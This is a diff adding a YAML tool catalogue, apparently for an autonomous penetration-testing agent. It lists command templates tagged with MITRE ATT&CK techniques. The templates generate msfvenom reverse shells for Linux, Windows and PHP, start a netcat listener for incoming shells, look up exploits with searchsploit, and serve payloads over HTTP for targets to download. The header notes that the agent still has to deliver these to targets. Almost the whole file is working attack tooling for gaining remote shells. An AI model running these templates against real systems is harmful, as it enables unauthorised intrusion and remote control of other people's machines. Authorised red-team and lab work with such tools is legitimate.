@@ -1,0 +1,107 @@
+# Execution (TA0002): payload generation and reverse-shell setup. These tools
+# build artifacts on the Kali attacker; the agent still has to *deliver* them
+# to the target via some other technique (web upload, SMB write, etc.).
+
+tools:
+  - name: msfvenom_linux_x86_reverse
+    category: exploit
+    description: Generate a Linux/x86 staged reverse shell ELF.
+    command_template: "msfvenom -p linux/x86/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/sh-{lport}.elf"
+    slots:
+      - { name: lhost, type: ip, description: attacker listen IP (Kali tun0 typically) }
+      - { name: lport, type: port, description: attacker listen port, default: 4444 }
+    runtime_cap_seconds: 60
+    output_parser_id: msfvenom
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0002, TA0011]
+      techniques: [T1059.004, T1105]
+    example_invocation: { lhost: 10.10.14.2, lport: 4444 }
+    example_output: |
+      Payload size: 99 bytes
+      Final size of elf file: 207 bytes
+      Saved as: /tmp/sh-4444.elf
+
+  - name: msfvenom_windows_x64_reverse
+    category: exploit
+    description: Generate a Windows x64 reverse shell EXE.
+    command_template: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/sh-{lport}.exe"
+    slots:
+      - { name: lhost, type: ip, description: attacker IP }
+      - { name: lport, type: port, description: attacker port, default: 4444 }
+    runtime_cap_seconds: 60
+    output_parser_id: msfvenom
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0002, TA0011]
+      techniques: [T1059.003, T1105]
+    example_invocation: { lhost: 10.10.14.2, lport: 4444 }
+    example_output: |
+      Saved as: /tmp/sh-4444.exe
+
+  - name: msfvenom_php_reverse
+    category: exploit
+    description: Generate a PHP reverse shell payload (single-file webshell).
+    command_template: "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell-{lport}.php"
+    slots:
+      - { name: lhost, type: ip, description: attacker IP }
+      - { name: lport, type: port, description: attacker port, default: 4444 }
+    runtime_cap_seconds: 30
+    output_parser_id: msfvenom
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0002]
+      techniques: [T1059.007, T1505.003]
+    example_invocation: { lhost: 10.10.14.2, lport: 4444 }
+    example_output: |
+      Saved as: /tmp/shell-4444.php
+
+  - name: nc_listener
+    category: exploit
+    description: Start a netcat listener for an incoming reverse shell. Single connection only.
+    command_template: "timeout 600 nc -lvnp {lport}"
+    slots:
+      - { name: lport, type: port, description: port to listen on, default: 4444 }
+    runtime_cap_seconds: 620
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0011]
+      techniques: [T1071.001]
+    example_invocation: { lport: 4444 }
+    example_output: |
+      Listening on 0.0.0.0 4444
+      Connection received on 10.10.10.5 49152
+
+  - name: searchsploit_lookup
+    category: recon
+    description: Search exploitdb for known exploits matching a service or CVE.
+    command_template: "searchsploit --color=never {query}"
+    slots:
+      - { name: query, type: free_string, description: "search terms (e.g. 'apache 2.4.49')" }
+    runtime_cap_seconds: 30
+    output_parser_id: searchsploit
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0042]
+      techniques: [T1588.005]
+    example_invocation: { query: "apache 2.4.49" }
+    example_output: |
+      Apache 2.4.49 - Path Traversal | linux/webapps/50383.py
+
+  - name: python_simple_http_server
+    category: exploit
+    description: Host a directory via HTTP for the target to download from.
+    command_template: "timeout 600 python3 -m http.server {lport} --directory {root}"
+    slots:
+      - { name: lport, type: port, description: port to bind, default: 8080 }
+      - { name: root, type: file_path, description: directory to serve, default: /tmp }
+    runtime_cap_seconds: 620
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0011]
+      techniques: [T1071.001, T1105]
+    example_invocation: { lport: 8080, root: /tmp }
+    example_output: |
+      Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
